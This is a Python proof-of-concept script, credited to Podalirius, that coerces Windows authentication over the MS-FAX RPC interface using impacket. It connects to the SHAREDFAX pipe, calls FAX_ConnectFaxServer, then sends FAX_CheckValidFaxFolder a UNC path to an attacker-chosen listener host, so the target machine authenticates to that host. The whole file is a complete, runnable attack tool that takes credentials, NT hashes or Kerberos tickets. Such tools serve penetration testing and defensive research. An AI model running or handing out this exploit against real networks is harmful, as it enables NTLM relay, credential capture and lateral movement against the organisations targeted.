#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : coerce_poc.py
# Author             : Podalirius (@podalirius_)
# Date created       : 01 July 2022


import sys
import argparse
from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'SessionError: unknown error code: 0x%x' % self.error_code


class FAX_ConnectFaxServer(NDRCALL):
    # Opnum 80: the required prerequisite. It establishes the caller's fax user account
    # context; FAX_CheckValidFaxFolder is denied without a prior successful connection.
    opnum = 80
    structure = (
        ('dwClientAPIVersion', DWORD),  # FAX_API_VERSION_3 = 0x00030000
    )


class FAX_ConnectFaxServerResponse(NDRCALL):
    structure = (
        ('lpdwServerAPIVersion', DWORD),
        ('pHandle', '20s'),  # PRPC_FAX_SVC_HANDLE (20-byte context handle)
    )


class FAX_CheckValidFaxFolder(NDRCALL):
    # hBinding is the implicit handle_t of the IDL and is therefore NOT a marshalled field;
    # lpcwstrPath is [in, string, ref] LPCWSTR and must be a complete UNC path including a
    # file name, under 180 characters.
    opnum = 86
    structure = (
        ('lpcwstrPath', LPWSTR),
    )


class FAX_CheckValidFaxFolderResponse(NDRCALL):
    structure = ()


class RPCProtocol(object):
    """
    Documentation for class RPCProtocol
    """

    uuid = None
    version = None
    pipe = None

    ncan_target = None
    __rpctransport = None
    dce = None

    def __init__(self):
        super(RPCProtocol, self).__init__()

    def connect(self, username, password, domain, lmhash, nthash, target, dcHost, doKerberos=False, targetIp=None):
        self.ncan_target = r'ncacn_np:%s[%s]' % (target, self.pipe)
        self.__rpctransport = transport.DCERPCTransportFactory(self.ncan_target)

        if hasattr(self.__rpctransport, 'set_credentials'):
            self.__rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash
            )

        if doKerberos == True:
            self.__rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp is not None:
            self.__rpctransport.setRemoteHost(targetIp)

        self.dce = self.__rpctransport.get_dce_rpc()
        self.dce.set_auth_type(RPC_C_AUTHN_WINNT)
        self.dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        print("[>] Connecting to %s ... " % self.ncan_target, end="")
        sys.stdout.flush()
        try:
            self.dce.connect()
        except Exception as e:
            print("\x1b[1;91mfail\x1b[0m")
            print("[!] Something went wrong, check error status => %s" % str(e))
            return False
        else:
            print("\x1b[1;92msuccess\x1b[0m")

        print("[>] Binding to <uuid='%s', version='%s'> ... " % (self.uuid, self.version), end="")
        sys.stdout.flush()
        try:
            self.dce.bind(uuidtup_to_bin((self.uuid, self.version)))
        except Exception as e:
            print("\x1b[1;91mfail\x1b[0m")
            print("[!] Something went wrong, check error status => %s" % str(e))
            return False
        else:
            print("\x1b[1;92msuccess\x1b[0m")

        return True


class MS_FAX(RPCProtocol):
    uuid = "ea0a3165-4834-11d2-a6f8-00c04fa346cc"
    version = "4.0"
    pipe = r"\PIPE\SHAREDFAX"

    def FAX_CheckValidFaxFolder(self, listener):
        if self.dce is None:
            print("[!] Error: dce is None, you must call connect() first.")
            return
        # Prerequisite: FAX_ConnectFaxServer (opnum 80) establishes the fax user account
        # context for the association ([MS-FAX] 3.1.4.1.10).
        print("[>] Calling FAX_ConnectFaxServer() ...")
        try:
            conn = FAX_ConnectFaxServer()
            conn['dwClientAPIVersion'] = 0x00030000  # FAX_API_VERSION_3
            r = self.dce.request(conn)
            print("[+] Connected, server API version = 0x%08x" % r['lpdwServerAPIVersion'])
        except Exception as e:
            print("[!] FAX_ConnectFaxServer failed: %s" % e)
            return
        # The coerced path: a complete UNC path with a file name. The server resolves it to
        # confirm the folder is accessible ([MS-FAX] 3.1.4.1.86), authenticating on the way.
        print("[>] Calling FAX_CheckValidFaxFolder() ...")
        try:
            request = FAX_CheckValidFaxFolder()
            request['lpcwstrPath'] = ('\\\\%s\\share\\file.tif' % listener) + '\x00'
            resp = self.dce.request(request)
        except Exception as e:
            print(e)


if __name__ == '__main__':
    print("Windows auth coerce using MS-FAX::FAX_CheckValidFaxFolder()\n")
    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-FAX::FAX_CheckValidFaxFolder()")

    parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
    parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
    parser.add_argument("-d", "--domain", default="", help="Windows domain name to authenticate to the endpoint.")
    parser.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (LM hash can be empty)")
    parser.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    parser.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")
    parser.add_argument("--dc-ip", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
    parser.add_argument("--target-ip", action="store", metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it")

    parser.add_argument("listener", help="IP address or hostname of listener")
    parser.add_argument("target", help="IP address or hostname of target")

    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash, nthash = '', ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass

        options.password = getpass("Password:")

    protocol = MS_FAX()

    connected = protocol.connect(
        username=options.username,
        password=options.password,
        domain=options.domain,
        lmhash=lmhash,
        nthash=nthash,
        target=options.target,
        doKerberos=options.kerberos,
        dcHost=options.dc_ip,
        targetIp=options.target_ip
    )

    if connected:
        protocol.FAX_CheckValidFaxFolder(options.listener)

    sys.exit()